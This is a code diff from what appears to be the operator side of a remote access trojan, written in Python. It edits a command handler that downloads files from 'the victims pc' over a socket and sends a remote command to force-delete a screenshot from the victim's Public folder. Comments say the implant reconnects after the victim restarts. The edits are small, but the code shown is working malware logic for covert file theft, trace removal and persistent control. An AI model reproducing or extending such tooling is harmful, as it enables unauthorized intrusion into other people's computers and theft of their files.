@@ -293,7 +293,7 @@ class Commands:
         # downloads a file from given path
         elif message == "download":
             if args:
-                path = " ".join(args).replace("\\", "/")
+                path = " ".join(args).replace("\\", "/").replace(" ", "")
                 ending = path[path.rfind("."):]
                 drive = path[0].upper()
                 path = path[1:]
@@ -307,6 +307,7 @@ class Commands:
                     while download:
                         if download[-4:] != b"done":
                             with open(f"{name}{ending}", "ab") as file:
+                                print("receiving")
                                 file.write(download)
                             download = conn.recv(2048)
                         else:
@@ -358,8 +359,7 @@ class Commands:
                     sendMessage("c n del /f /Q C:\\Users\\Public\\monitor-1.png")
                     return
 
-
-                    # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
+         # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
         elif message == "disconnect":
             sendMessage("!dsc")
             conn.close()
